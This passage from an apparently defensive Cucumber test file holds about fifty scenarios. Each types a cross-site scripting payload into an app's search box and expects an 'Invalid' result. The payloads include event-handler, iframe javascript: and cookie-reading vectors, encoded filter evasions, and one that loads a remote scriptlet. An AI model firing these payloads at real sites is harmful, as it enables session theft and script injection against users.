		When I enter "<IMG SRC=x onpaste=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S449 XSS Test 449

		When I enter "<IMG SRC=x onabort=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S450 XSS Test 450

		When I enter "<IMG SRC=x oncanplay=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S451 XSS Test 451

		When I enter "<IMG SRC=x oncanplaythrough=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S452 XSS Test 452

		When I enter "<IMG SRC=x oncuechange=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S453 XSS Test 453

		When I enter "<IMG SRC=x ondurationchange=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S454 XSS Test 454

		When I enter "<IMG SRC=x onemptied=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S455 XSS Test 455

		When I enter "<IMG SRC=x onended=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S456 XSS Test 456

		When I enter "<IMG SRC=x onerror=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S457 XSS Test 457

		When I enter "<IMG SRC=x onloadeddata=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S458 XSS Test 458

		When I enter "<IMG SRC=x onloadedmetadata=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S459 XSS Test 459

		When I enter "<IMG SRC=x onloadstart=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S460 XSS Test 460

		When I enter "<IMG SRC=x onpause=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S461 XSS Test 461

		When I enter "<IMG SRC=x onplay=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S462 XSS Test 462

		When I enter "<IMG SRC=x onplaying=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S463 XSS Test 463

		When I enter "<IMG SRC=x onprogress=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S464 XSS Test 464

		When I enter "<IMG SRC=x onratechange=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S465 XSS Test 465

		When I enter "<IMG SRC=x onseeked=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S466 XSS Test 466

		When I enter "<IMG SRC=x onseeking=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S467 XSS Test 467

		When I enter "<IMG SRC=x onstalled=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S468 XSS Test 468

		When I enter "<IMG SRC=x onsuspend=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S469 XSS Test 469

		When I enter "<IMG SRC=x ontimeupdate=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S470 XSS Test 470

		When I enter "<IMG SRC=x onvolumechange=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S471 XSS Test 471

		When I enter "<IMG SRC=x onwaiting=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S472 XSS Test 472

		When I enter "<IMG SRC=x onshow=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S473 XSS Test 473

		When I enter "<IMG SRC=x ontoggle=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S474 XSS Test 474

		When I enter "<META onpaonpageonpagonpageonpageshowshoweshowshowgeshow=\"alert(1)\";" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S475 XSS Test 475

		When I enter "<IMG SRC=x onload=\"alert(String.fromCharCode(88,83,83))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S476 XSS Test 476

		When I enter "<INPUT TYPE=\"BUTTON\" action=\"alert('XSS')\"/>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S477 XSS Test 477

		When I enter "\"><h1><IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>\">123</h1>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S478 XSS Test 478

		When I enter "\"><h1><IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>123</h1>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S479 XSS Test 479

		When I enter "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S480 XSS Test 480

		When I enter "<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S481 XSS Test 481

		When I enter "\"><h1><IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>123</h1>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S482 XSS Test 482

		When I enter "\"></iframe><script>alert(`TEXT YOU WANT TO BE DISPLAYED`);</script><iframe frameborder=\"0%EF%BB%BF" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S483 XSS Test 483

		When I enter "\"><h1><IFRAME width=\"420\" height=\"315\" SRC=\"http://www.youtube.com/embed/sxvccpasgTE\" frameborder=\"0\" onmouseover=\"alert(document.cookie)\"></IFRAME>123</h1>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S484 XSS Test 484

		When I enter "\"><h1><iframe width=\"420\" height=\"315\" src=\"http://www.youtube.com/embed/sxvccpasgTE\" frameborder=\"0\" allowfullscreen></iframe>123</h1>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S485 XSS Test 485

		When I enter "><h1><IFRAME width=\"420\" height=\"315\" frameborder=\"0\" onmouseover=\"document.location.href='https://www.youtube.com/channel/UC9Qa_gXarSmObPX3ooIQZr" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S486 XSS Test 486

		When I enter "g'\"></IFRAME>Hover the cursor to the LEFT of this Message</h1>&ParamHeight=250" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S487 XSS Test 487

		When I enter "<IFRAME width=\"420\" height=\"315\" frameborder=\"0\" onload=\"alert(document.cookie)\"></IFRAME>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S488 XSS Test 488

		When I enter "\"><h1><IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>\">123</h1>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S489 XSS Test 489

		When I enter "\"><h1><IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>123</h1>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S490 XSS Test 490

		When I enter "<iframe src=http://xss.rocks/scriptlet.html <" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S491 XSS Test 491

		When I enter "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S492 XSS Test 492

		When I enter "<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S493 XSS Test 493

		When I enter "<iframe src=\"&Tab;javascript:prompt(1)&Tab;\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S494 XSS Test 494

		When I enter "<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S495 XSS Test 495

		When I enter "<input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\"" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S496 XSS Test 496

		When I enter "<sVg><scRipt >alert&lpar;1&rpar; {Opera}" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S497 XSS Test 497

		When I enter "<img/src=`` onerror=this.onerror=confirm(1) " in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S498 XSS Test 498

		When I enter "<form><isindex formaction=\"javascript&colon;confirm(1)\"" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S499 XSS Test 499

		When I enter "<img src=``&NewLine; onerror=alert(1)&NewLine;" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

